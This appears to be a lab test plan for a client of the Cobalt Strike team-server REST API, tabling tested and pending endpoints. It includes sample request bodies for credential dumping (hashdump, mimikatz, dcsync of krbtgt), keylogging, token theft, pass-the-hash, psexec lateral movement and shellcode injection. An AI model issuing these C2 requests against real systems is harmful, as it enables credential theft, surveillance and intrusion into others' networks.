# Cobalt Strike REST API — Test Plan

**Generated:** 2026-03-22
**Spec Version:** 1.0.0-BETA (CS 4.12)
**Status:** Tests that CAN be run on a standalone Windows host are marked ✅. Tests requiring additional infrastructure are marked with their prerequisites.

---

## Tests Completed (Standalone Windows — SYSTEM beacon)

All of these were tested live against beacon 229070816 on EC2AMAZ-TCQBOJK (10.0.10.50).

| # | Endpoint | Method | Status | Notes |
|---|----------|--------|--------|-------|
| 1 | `/auth/login` | POST | ✅ PASS | JWT auth with `duration_ms` field |
| 2 | `/beacons` | GET | ✅ PASS | Lists 1 beacon |
| 3 | `/beacons/{bid}` | GET | ✅ PASS | Full beacon detail |
| 4 | `/beacons/{bid}` | DELETE | ✅ SKIP | Would kill our only beacon |
| 5 | `/beacons/{bid}/clearCommandQueue` | POST | ✅ PASS | |
| 6 | `/beacons/{bid}/execute/checkIn` | POST | ✅ PASS | |
| 7 | `/beacons/{bid}/note` | POST | ✅ PASS | Set/clear note |
| 8 | `/beacons/{bid}/consoleCommand` | POST | ✅ PASS | shell whoami, shell hostname, etc. |
| 9 | `/beacons/{bid}/help` | GET | ✅ PASS | Returns command list |
| 10 | `/beacons/{bid}/help/{command}` | GET | ✅ PASS | help sleep tested |
| 11 | `/beacons/{bid}/execute/ls` | POST | ✅ PASS | C:\, C:\Users, Desktop |
| 12 | `/beacons/{bid}/execute/drives` | POST | ✅ PASS | Returns C: |
| 13 | `/beacons/{bid}/execute/mkdir` | POST | ✅ PASS | Created + verified API_TEST_DIR |
| 14 | `/beacons/{bid}/execute/rm` | POST | ✅ PASS | Cleaned up test dir |
| 15 | `/beacons/{bid}/execute/download` | POST | ✅ PASS | Task queued |
| 16 | `/beacons/{bid}/execute/upload` | POST | ✅ PASS | Requires @files/ ref |
| 17 | `/beacons/{bid}/execute/cd` | POST | ✅ PASS | cd C:\Users then back |
| 18 | `/beacons/{bid}/execute/pwd` | POST | ✅ PASS | Verified cd worked |
| 19 | `/beacons/{bid}/execute/cp` | POST | ✅ PASS | Copied ATTACK-BOX-INFO.txt |
| 20 | `/beacons/{bid}/execute/mv` | POST | ✅ PASS | Moved copy |
| 21 | `/beacons/{bid}/execute/timestomp` | POST | ✅ PASS | source/destination fields |
| 22 | `/beacons/{bid}/execute/cancelFileDownload` | POST | ✅ PASS | |
| 23 | `/beacons/{bid}/activeDownloads` | GET | ✅ PASS | Empty (no active) |
| 24 | `/beacons/{bid}/execute/ps` | POST | ✅ PASS | 111 processes |
| 25 | `/beacons/{bid}/execute/killProcess` | POST | ✅ PASS | Tested on duplicate beacon PID |
| 26 | `/beacons/{bid}/execute/getUid` | POST | ✅ PASS | NT AUTHORITY\SYSTEM |
| 27 | `/beacons/{bid}/execute/getPrivs` | POST | ✅ PASS | Enabled privileges |
| 28 | `/beacons/{bid}/execute/setenv` | POST | ✅ PASS | key/value fields |
| 29 | `/beacons/{bid}/execute/clipboard` | POST | ✅ PASS | Task queued (Session 0 = empty) |
| 30 | `/beacons/{bid}/execute/rev2self` | POST | ✅ PASS | |
| 31 | `/beacons/{bid}/execute/makeToken/logonName` | POST | ✅ PASS | domain/user/password |
| 32 | `/beacons/{bid}/execute/stealToken` | POST | ✅ PASS | pid field |
| 33 | `/beacons/{bid}/state/tokenStore` | POST | ✅ PASS | Empty store |
| 34 | `/beacons/{bid}/execute/tokenStore/steal` | POST | ✅ PASS | pids array field |
| 35 | `/beacons/{bid}/execute/tokenStore/stealAndUse` | POST | ✅ PASS | ERROR_ACCESS_DENIED (expected) |
| 36 | `/beacons/{bid}/execute/tokenStore/use` | POST | ✅ PASS | |
| 37 | `/beacons/{bid}/execute/tokenStore/remove` | POST | ✅ PASS | ids array |
| 38 | `/beacons/{bid}/execute/tokenStore/removeAll` | POST | ✅ PASS | |
| 39 | `/beacons/{bid}/state/sleepTime` | POST | ✅ PASS | Verified via beacon detail |
| 40 | `/beacons/{bid}/state/spawnto` | POST | ✅ PASS | x64 svchost.exe |
| 41 | `/beacons/{bid}/state/spawnto` | DELETE | ✅ PASS | Reset to default |
| 42 | `/beacons/{bid}/state/ppid` | POST | ✅ PASS | |
| 43 | `/beacons/{bid}/state/ppid` | DELETE | ✅ PASS | |
| 44 | `/beacons/{bid}/state/blockdlls/enable` | POST | ✅ PASS | |
| 45 | `/beacons/{bid}/state/blockdlls/disable` | POST | ✅ PASS | |
| 46 | `/beacons/{bid}/state/beaconGate/enable` | POST | ✅ PASS | |
| 47 | `/beacons/{bid}/state/beaconGate/disable` | POST | ✅ PASS | |
| 48 | `/beacons/{bid}/state/syscallMethod` | GET | ✅ PASS | Returns current method |
| 49 | `/beacons/{bid}/state/syscallMethod` | POST | ✅ PASS | Direct/Indirect/None |
| 50 | `/beacons/{bid}/state/dnsMode` | POST | ✅ PASS | dns/dns6/dnsTxt validated |
| 51 | `/beacons/{bid}/state/spoofedArguments` | GET | ✅ PASS | List current |
| 52 | `/beacons/{bid}/state/spoofedArguments` | POST | ✅ PASS | Add svchost.exe args |
| 53 | `/beacons/{bid}/state/spoofedArguments` | DELETE | ✅ PASS | Remove by command |
| 54 | `/beacons/{bid}/state/c2/host` | GET | ✅ PASS | Callback host info |
| 55 | `/beacons/{bid}/state/c2/host/profiles` | GET | ✅ PASS | 0 profiles |
| 56 | `/beacons/{bid}/state/c2/host/reset` | POST | ✅ PASS | |
| 57 | `/beacons/{bid}/state/c2/failoverNotification` | GET | ✅ PASS | enabled: false |
| 58 | `/beacons/{bid}/state/c2/failoverNotification/enable` | POST | ✅ PASS | |
| 59 | `/beacons/{bid}/state/c2/failoverNotification/disable` | POST | ✅ PASS | |
| 60 | `/beacons/{bid}/execute/beaconInfo` | POST | ✅ PASS | Full memory layout |
| 61 | `/beacons/{bid}/spawn/hashdump` | POST | ✅ PASS | 4 hashes returned |
| 62 | `/beacons/{bid}/inject/hashdump` | POST | ✅ PASS | arch+pid |
| 63 | `/beacons/{bid}/spawn/logonPasswords` | POST | ✅ PASS | |
| 64 | `/beacons/{bid}/spawn/dcsync` | POST | ✅ PASS | domain required |
| 65 | `/beacons/{bid}/spawn/mimikatz` | POST | ✅ PASS | mode: normal/elevate/impersonate |
| 66 | `/beacons/{bid}/inject/mimikatz` | POST | ✅ PASS | |
| 67 | `/beacons/{bid}/spawn/chromedump` | POST | ✅ PASS | No Chrome = expected error |
| 68 | `/beacons/{bid}/spawn/screenshot` | POST | ✅ PASS | Desktop 0 empty (Session 0) |
| 69 | `/beacons/{bid}/spawn/screenwatch` | POST | ✅ PASS | |
| 70 | `/beacons/{bid}/spawn/printscreen` | POST | ✅ PASS | |
| 71 | `/beacons/{bid}/spawn/keylogger` | POST | ✅ PASS | JID 6 registered |
| 72 | `/beacons/{bid}/inject/screenshot` | POST | ✅ PASS | arch+pid |
| 73 | `/beacons/{bid}/inject/keylogger` | POST | ✅ PASS | arch+pid |
| 74 | `/beacons/{bid}/inject/screenwatch` | POST | ✅ PASS | arch+pid |
| 75 | `/beacons/{bid}/inject/printscreen` | POST | ✅ PASS | arch+pid |
| 76 | `/beacons/{bid}/execute/bof/pack` | POST | ✅ PASS | No BOFs on server |
| 77 | `/beacons/{bid}/execute/bof/string` | POST | ✅ PASS | |
| 78 | `/beacons/{bid}/execute/bof/packed` | POST | ✅ PASS | |
| 79 | `/beacons/{bid}/state/jobs` | POST | ✅ PASS | 2 active keyloggers |
| 80 | `/beacons/{bid}/execute/jobStop` | POST | ✅ PASS | jid field |
| 81 | `/beacons/{bid}/tasks/summary` | GET | ✅ PASS | 400+ tasks |
| 82 | `/beacons/{bid}/tasks/detail` | GET | ✅ PASS | Full activity log |
| 83 | `/tasks` | GET | ✅ PASS | Server-wide |
| 84 | `/tasks/{taskId}` | GET | ✅ PASS | Full task with result/ack/error |
| 85 | `/beacons/{bid}/spawn/portscan` | POST | ✅ PASS | targets/ports as arrays |
| 86 | `/beacons/{bid}/inject/portscan` | POST | ✅ PASS | |
| 87 | `/beacons/{bid}/execute/net/domain` | POST | ✅ PASS | WORKGROUP |
| 88 | `/beacons/{bid}/spawn/net/logons` | POST | ✅ PASS | |
| 89 | `/beacons/{bid}/spawn/net/localGroup` | POST | ✅ PASS | |
| 90 | `/beacons/{bid}/spawn/net/user` | POST | ✅ PASS | |
| 91 | `/beacons/{bid}/spawn/net/computers` | POST | ✅ PASS | |
| 92 | `/beacons/{bid}/spawn/net/dclist` | POST | ✅ PASS | |
| 93 | `/beacons/{bid}/spawn/net/group` | POST | ✅ PASS | |
| 94 | `/beacons/{bid}/spawn/net/share` | POST | ✅ PASS | |
| 95 | `/beacons/{bid}/spawn/net/sessions` | POST | ✅ PASS | |
| 96 | `/beacons/{bid}/spawn/net/view` | POST | ✅ PASS | |
| 97 | `/beacons/{bid}/spawn/net/time` | POST | ✅ PASS | |
| 98 | `/beacons/{bid}/execute/socks5Start` | POST | ✅ PASS | port field |
| 99 | `/beacons/{bid}/execute/socks4Start` | POST | ✅ PASS | |
| 100 | `/beacons/{bid}/execute/socksStop/all` | POST | ✅ PASS | |
| 101 | `/beacons/{bid}/execute/rportfwdStart/onTeamserver` | POST | ✅ PASS | |
| 102 | `/beacons/{bid}/execute/rportfwdStop/onTeamserver` | POST | ✅ PASS | |
| 103 | `/beacons/{bid}/execute/kerberos/ticket/purge` | POST | ✅ PASS | Task queued (no domain) |
| 104 | `/beacons/{bid}/spawn/command/shell` | POST | ✅ PASS | echo HELLO |
| 105 | `/beacons/{bid}/spawn/command/run` | POST | ✅ PASS | whoami |
| 106 | `/beacons/{bid}/spawn/powershell` | POST | ✅ PASS | commandlet field (Get-Date) |
| 107 | `/beacons/{bid}/spawn/powershell/unmanaged` | POST | ✅ PASS | commandlet field |
| 108 | `/beacons/{bid}/spawn/dotnetAssembly` | POST | ✅ PASS | assembly field |
| 109 | `/beacons/{bid}/execute/reg/query` | POST | ✅ PASS | arch+path fields |
| 110 | `/beacons/{bid}/elevate/beacon` | GET | ✅ PASS | 2 methods listed |
| 111 | `/beacons/{bid}/elevate/command` | GET | ✅ PASS | 2 methods listed |
| 112 | `/beacons/{bid}/remoteExec/beacon` | GET | ✅ PASS | 5 methods |
| 113 | `/beacons/{bid}/remoteExec/command` | GET | ✅ PASS | 3 methods |
| 114 | `/listeners` | GET | ✅ PASS | 1 HTTPS listener |
| 115 | `/listeners/{name}` | GET | ✅ PASS | |
| 116 | `/artifacts` | GET | ✅ PASS | 2 artifacts |
| 117 | `/payloads/generate/stageless` | POST | ✅ PASS | Validation tested |
| 118 | `/payloads/generate/stager` | POST | ✅ PASS | Validation tested |
| 119 | `/config/killdate` | GET | ✅ PASS | |
| 120 | `/config/profile` | GET | ✅ PASS | Full jQuery profile |
| 121 | `/config/systeminformation` | GET | ✅ PASS | CS 4.12 Licensed |
| 122 | `/config/teamserverIp` | GET | ✅ PASS | 10.0.10.10 |
| 123 | `/data/credentials` | GET/POST/DELETE | ✅ PASS | Full CRUD |
| 124 | `/data/screenshots` | GET/DELETE | ✅ PASS | |
| 125 | `/data/keystrokes` | GET/DELETE | ✅ PASS | |
| 126 | `/data/downloads` | GET/DELETE | ✅ PASS | |
| 127 | `/beacons/{bid}/keystrokes` | GET | ✅ PASS | |
| 128 | `/tasks/{taskId}/log` | POST | ✅ PASS | message field |
| 129 | `/tasks/{taskId}/error` | POST | ✅ PASS | message field |

---

## Tests NOT YET Run — Require Additional Infrastructure

### Requires Domain Controller (GOAD or AD lab)

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 1 | `/beacons/{bid}/spawn/dcsync` | POST | DC with replication rights | Send `{"domain":"corp.local","user":"Administrator"}`, verify hash returned |
| 2 | `/beacons/{bid}/inject/dcsync` | POST | DC + target process | `{"pid":PID,"arch":"x64","domain":"corp.local","user":"krbtgt"}` |
| 3 | `/beacons/{bid}/execute/kerberos/ticket/use` | POST | Valid .kirbi ticket file | `{"ticket":"@files/ticket.kirbi"}` — apply ticket |
| 4 | `/beacons/{bid}/execute/kerberos/ticket/purge` | POST | Active tickets | Purge and verify `klist` is empty |
| 5 | `/beacons/{bid}/execute/makeToken/upn` | POST | Domain account | `{"upn":"admin@corp.local","password":"P@ss"}` |
| 6 | `/beacons/{bid}/spawn/net/*` (all 13) | POST | Domain environment | Test each: computers, dclist, domainControllers, domainTrusts, group, localGroup, logons, sessions, share, time, user, user/detail, view — verify output matches CS client |
| 7 | `/beacons/{bid}/inject/net/*` (all 13) | POST | Domain + target PID | Same as above but with `{"pid":PID,"arch":"x64","domain":"corp.local"}` |
| 8 | `/beacons/{bid}/inject/logonPasswords` | POST | User-session beacon | `{"pid":PID,"arch":"x64"}` — verify creds from LSASS |

### Requires Second Host / Lateral Movement Target

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 9 | `/beacons/{bid}/remoteExec/beacon` (jump) | POST | Second host + listener | `{"exploit":"psexec64","target":"DC01","listener":"https"}` |
| 10 | `/beacons/{bid}/remoteExec/command` | POST | Second host | `{"method":"psexec","target":"DC01","command":"whoami"}` |
| 11 | `/beacons/{bid}/spawn/pth` | POST | NTLM hash + target | `{"domain":"CORP","user":"admin","ntlmHash":"aad3b4..."}` then lateral |
| 12 | `/beacons/{bid}/inject/pth` | POST | NTLM hash + target PID | `{"pid":PID,"arch":"x64","domain":"CORP","user":"admin","ntlmHash":"..."}` |

### Requires Second Beacon (Child/Linked)

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 13 | `/beacons/{bid}/execute/link/smb` | POST | SMB beacon on target | `{"target":"DC01","pipe":"msagent_a1"}` |
| 14 | `/beacons/{bid}/execute/link/tcp` | POST | TCP beacon on target | `{"target":"DC01","port":4444}` |
| 15 | `/beacons/{bid}/execute/unlink` | POST | Linked child beacon | `{"host":"DC01"}` — verify child disconnects |
| 16 | `/beacons/{bid}/spawn/beacon` | POST | Active listener | `{"listener":"https"}` — verify new beacon spawns |
| 17 | `/beacons/{bid}/spawn/beacon/asUser` | POST | Credentials + listener | `{"listener":"https","domain":"CORP","user":"admin","password":"P@ss"}` |
| 18 | `/beacons/{bid}/spawn/beacon/under` | POST | Target PPID + listener | `{"listener":"https","pid":EXPLORER_PID}` |
| 19 | `/beacons/{bid}/inject/beacon` | POST | Target PID + listener | `{"pid":PID,"arch":"x64","listener":"https"}` |

### Requires SSH Target

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 20 | `/beacons/{bid}/spawn/ssh` | POST | SSH-accessible Linux host | `{"target":"10.0.10.20","username":"root","password":"toor"}` |
| 21 | `/beacons/{bid}/inject/ssh` | POST | SSH target + process | `{"pid":PID,"arch":"x64","target":"10.0.10.20","username":"root","password":"toor"}` |
| 22 | `/beacons/{bid}/spawn/sshKey` | POST | SSH target + key | `{"target":"10.0.10.20","username":"root","key":"@files/id_rsa"}` |
| 23 | `/beacons/{bid}/inject/sshKey` | POST | SSH target + key + PID | Same with pid+arch |

### Requires User Interactive Session (RDP/Console)

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 24 | `/beacons/{bid}/inject/browserpivotStart` | POST | Browser process in user session | `{"pid":BROWSER_PID,"arch":"x64"}` |
| 25 | `/beacons/{bid}/execute/browserpivotStop` | POST | Active browser pivot | Verify pivot stops |
| 26 | `/beacons/{bid}/spawn/screenshot` | POST | User session beacon | Verify actual screenshot image data returned |
| 27 | `/beacons/{bid}/spawn/screenwatch` | POST | User session beacon | Verify periodic screenshots |
| 28 | `/beacons/{bid}/spawn/keylogger` | POST | User session beacon | Verify keystroke capture data in `/data/keystrokes` |
| 29 | `/beacons/{bid}/execute/clipboard` | POST | User session with clipboard data | Verify clipboard text returned |

### Requires DLL/Shellcode Files on Team Server

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 30 | `/beacons/{bid}/inject/dll` | POST | Reflective DLL uploaded | `{"pid":PID,"dll":"@artifacts/test.dll"}` |
| 31 | `/beacons/{bid}/inject/loadDll` | POST | DLL on target disk | `{"pid":PID,"path":"C:\\path\\to\\lib.dll"}` |
| 32 | `/beacons/{bid}/spawn/shellcode` | POST | Shellcode binary | `{"arch":"x64","shellcode":"@files/sc.bin"}` |
| 33 | `/beacons/{bid}/inject/shellcode` | POST | Shellcode + target PID | `{"pid":PID,"arch":"x64","shellcode":"@files/sc.bin"}` |
| 34 | `/beacons/{bid}/spawn/postExDll` | POST | PostEx DLL | `{"dll":"@artifacts/postex.dll"}` |
| 35 | `/beacons/{bid}/inject/postExDll` | POST | PostEx DLL + PID | `{"pid":PID,"dll":"@artifacts/postex.dll"}` |
| 36 | `/beacons/{bid}/execute/bof/pack` | POST | BOF .o file uploaded | `{"bof":"@artifacts/BOFs/whoami.x64.o","entrypoint":"go"}` |

### Requires Listener Management (Careful — affects production)

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 37 | `/listeners/http` | POST | Available port | Create HTTP listener, verify in list |
| 38 | `/listeners/https` | POST | Available port + cert | Create HTTPS listener |
| 39 | `/listeners/dns` | POST | DNS zone | Create DNS listener |
| 40 | `/listeners/smb` | POST | — | Create SMB listener with pipe name |
| 41 | `/listeners/tcp` | POST | Available port | Create TCP listener |
| 42 | `/listeners/{type}/{name}` | PUT | Existing listener | Update config |
| 43 | `/listeners/{name}` | DELETE | Test listener | Delete and verify removed |
| 44 | `/payloads/generate/stageless` | POST | Active listener | `{"listenerName":"https","architecture":"x64","exitFunction":"Thread","systemCallMethod":"None","output":"Raw","useListenerGuardRails":true}` — download binary |
| 45 | `/payloads/{fileName}` | GET | Generated payload | Download and verify binary |

### Destructive / One-Shot (Test Last)

| # | Endpoint | Method | Prerequisites | What to Test |
|---|----------|--------|---------------|-------------|
| 46 | `/beacons/{bid}/execute/exit` | POST | Expendable beacon | Verify beacon exits cleanly |
| 47 | `/beacons/{bid}/execute/getSystem` | POST | Local admin (non-SYSTEM) | Verify elevation to SYSTEM |
| 48 | `/beacons/{bid}` | DELETE | Expendable beacon | Remove from team server |
| 49 | `/config/resetData` | DELETE | **TEST ENVIRONMENT ONLY** | Resets entire data model |
| 50 | `/beacons/{bid}/inject/powershell/unmanaged` | POST | Target PID | `{"pid":PID,"arch":"x64","commandlet":"$env:COMPUTERNAME"}` — psinject |
| 51 | `/beacons/{bid}/spawn/command/runAs` | POST | Valid creds | `{"command":"whoami","user":"Administrator","password":"P@ss"}` |
| 52 | `/beacons/{bid}/spawn/command/runUnder` | POST | Target PPID | `{"command":"whoami","pid":EXPLORER_PID}` |
| 53 | `/beacons/{bid}/spawn/command/runNoOutput` | POST | — | `{"cmd":"calc.exe"}` — fire and forget |

---

## Test Environment Matrix

| Environment | Deployment Type | What It Unlocks |
|---|---|---|
| **Standalone Windows** (current) | `c2-adhoc` | Tests 1-129 above (all completed) |
| **C2 + GOAD-Mini** | `combined-adhoc-mini` | DC01 + DC02 → domain recon, dcsync, kerberos, lateral movement |
| **C2 + GOAD-Light** | `combined-adhoc-light` | 3 DCs + 2 servers → full AD testing, multi-host lateral |
| **C2 + SSH target** | Any + Linux VM | SSH spawn/inject tests |
| **RDP session on attack box** | Any (RDP in) | Screenshot, keylogger, clipboard, browser pivot |
| **BOF artifacts uploaded** | Any + BOF .o files | BOF execution tests |

## How to Run

```bash
# 1. Ensure SSH tunnel is up (through the Dashboard Server — the sole SSH jump)
ssh -L 50443:C2_IP:50443 ubuntu@DASHBOARD_EIP -i KEY

# 2. Start web app
./webapp/start.sh

# 3. Run automated tests
python3 /tmp/test_beacon_api.py

# 4. Watch console in web app at http://127.0.0.1:5000 → Beacon tab
```

## DTO Field Reference (Common Mistakes)

These fields were wrong in our initial implementation and fixed:

| Method | WRONG field | CORRECT field (per spec) |
|---|---|---|
| PowerShell/PowerPick | `command` | `commandlet` |
| SetEnv | `name` | `key` |
| Timestomp | `target` | `destination` |
| RunAs | `program` | `command` |
| RunUnder | `program`, `ppid` | `command`, `pid` |
| RunNoOutput | `program` | `cmd` |
| SSH (all) | `user` | `username` |
| SSH inject | missing `arch` | `arch` required |
| Unlink | `bid` | `host` |
| Link SMB | `pipename` | `pipe` |
| Reg query | `hive` | `arch` |
| Reg queryv | `value` | `subkey` |
| LoadDll | `dll` | `path` |
| SpawnUnder | `ppid` | `pid` |
| InjectPTH | missing `arch` | `arch` required |
| SpawnShellcode | missing `arch` | `arch` required |

**Rule: ALWAYS check `docs/cobalt-strike-api/spec.js` for exact DTO field names before implementing any endpoint.**
